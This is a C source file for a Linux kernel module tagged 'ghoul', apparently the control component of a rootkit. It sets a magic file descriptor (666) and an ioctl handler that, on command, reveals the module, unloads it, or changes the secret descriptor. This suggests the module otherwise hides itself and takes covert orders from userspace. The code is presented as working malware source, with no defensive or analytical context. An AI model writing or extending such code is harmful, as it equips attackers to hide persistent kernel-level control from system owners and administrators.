#include <linux/kernel.h>
#include "service.h"
#include "load.h"

unsigned int service_fd = 666;

int handle_ioctl_request(unsigned int fd, unsigned int cmd, unsigned long arg)
{
    if (fd != service_fd)
        return 0;
    
    pr_info("ghoul: ioctl request: fd=%u, cmd=%u, arg=%lu\n", fd, cmd, arg);
    
    switch (cmd)
    {
        case SERVICE_SHOW:
            show_self();
            break;
        case SERVICE_UNLOAD:
            show_self();
            unload_self();
            break;
        case SERVICE_CHANGE_FD:
            service_fd = (unsigned int)arg;
            break;
    }
    return 1;
}